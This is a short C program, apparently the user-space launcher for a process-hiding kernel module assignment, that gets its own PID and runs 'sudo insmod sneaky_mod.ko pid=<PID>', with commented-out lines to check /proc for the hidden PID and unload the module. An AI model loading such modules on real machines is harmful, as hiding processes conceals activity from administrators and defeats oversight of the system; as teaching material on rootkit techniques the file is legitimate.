#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main(void) {
  //get process ID
  int PID;
  PID = getpid();
  char num[20];
  //get PID as string
  sprintf(num, "%d", PID);
  char str[100];
  strcpy(str, "sudo insmod sneaky_mod.ko");
  strcat(str, " pid=");
  strcat(str, num);

  //Print Process ID
  printf("My process ID is: %d\n", PID);


  //
  //load kernel module
  system(str);

  //Tests that we hide PID in Process directory
  //  system("ls /proc");

  
  //Release kernel module 
  //  system("sudo rmmod sneaky_mod.ko");

  return EXIT_SUCCESS;

}
